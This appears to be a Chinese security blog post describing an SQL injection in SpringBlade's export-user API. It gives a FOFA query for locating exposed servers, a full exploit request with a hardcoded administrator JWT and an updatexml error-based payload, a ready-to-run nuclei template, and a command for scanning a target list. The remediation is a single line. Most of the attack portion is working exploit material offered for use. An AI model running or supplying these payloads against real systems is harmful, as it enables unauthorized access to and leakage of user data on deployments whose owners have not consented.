#  SpringBlade export-user SQL 注入漏洞   
原创 fgz  AI与网安   2024-01-21 09:50  
  
免  
责  
申  
明  
：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**  
  
  
  
01  
  
—  
  
漏洞名称  
  
  
  
SpringBlade export-user SQL 注入漏洞  
  
  
  
  
02  
  
—  
  
漏洞影响  
  
  
SpringBlade <= v3.2.0  
  
SpringBlade 社区版地址如下  
```
https://github.com/chillzhuang/SpringBlade?tab=readme-ov-file
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOZ2icdZUOVNG3s8K5Tezb4J7lxofGcSWabKwmOkswQ82JribIAkmgLciaSPiaZKbpN0WbN2TuY9tujsQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
03  
  
—  
  
漏洞描述  
  
  
SpringBlade 是一个由商业级项目升级优化而来的SpringCloud分布式微服务架构、SpringBoot单体式微服务架构并存的综合型项目，采用Java8 API重构了业务代码，完全遵循阿里巴巴编码规范。  
采用Spring Boot 2.7 、Spring Cloud 2021 、Mybatis 等核心技术，同时提供基于React和Vue的两个前端框架用于快速搭建企业级的SaaS多租户微服务平台。  
在github上有6.3K Star。  
该系统/api/blade-user/export-user接口存在SQL注入漏洞，会造成数据泄露。  
  
  
04  
  
—  
  
FOFA搜索语句  
  
```
body="https://bladex.vip"

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOZ2icdZUOVNG3s8K5Tezb4JwpwGQxY58C7kQNiaPtMRrDCoRkppU7ia74upKDtKPLPCsuLfvAE3U7ug/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
  
向该漏洞是个get请求，直接在浏览器中请求靶场，计算  
md5(  
102103122  
)  
```
http://192.168.40.130.90/api/blade-user/export-user?Blade-Auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ&account&realName&1-updatexml(1,concat(0x7e,md5(102103122),0x7e),1)=1
```  
  
  
响应内容如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOZ2icdZUOVNG3s8K5Tezb4JBDDWR8TvlrOEosI29yJWnSOsOKiaibZgFngDWTdAvrXPuc5Zclbo9TUA/640?wx_fmt=png&from=appmsg "")  
  
其中包含了  
102103122的MD5值  
  
6cfe798ba8e5b85feb50164c59f4bec  
  
漏洞复现成功  
  
  
  
  
06  
  
—  
  
nuclei poc  
  
  
poc文件内容如下  
```
id: SpringBlade-export-user-sqli

info:
  name: SpringBlade export-user SQL 注入漏洞
  author: fgz
  severity: high
  description: SpringBlade 是一个由商业级项目升级优化而来的SpringCloud分布式微服务架构、SpringBoot单体式微服务架构并存的综合型项目，采用Java8 API重构了业务代码，完全遵循阿里巴巴编码规范。采用Spring Boot 2.7 、Spring Cloud 2021 、Mybatis 等核心技术，同时提供基于React和Vue的两个前端框架用于快速搭建企业级的SaaS多租户微服务平台。在github上有6.3K Star。该系统/api/blade-user/export-user接口存在SQL注入漏洞，会造成数据泄露。
  metadata:
    max-request: 1
    fofa-query: body="https://bladex.vip"
    verified: true
requests:
  - raw:
      - |+
        GET /api/blade-user/export-user?Blade-Auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ&account=&realName=&1-updatexml(1,concat(0x7e,md5(102103122),0x7e),1)=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip, deflate
        Connection: close

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body, '6cfe798ba8e5b85feb50164c59f4bec')"
```  
  
运行POC  
```
nuclei.exe -t mypoc/其他/SpringBlade-export-user-sqli.yaml -l data/SpringBlade.txt
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOZ2icdZUOVNG3s8K5Tezb4JIdc2V0OE2HIZbe244skJ0icj4nj0t15FXicaXgxIP9NAfCQpqtoqFMbw/640?wx_fmt=png&from=appmsg "")  
  
  
  
07  
  
—  
  
修复建议  
  
  
升级到最新版本。  
  
  
  
  
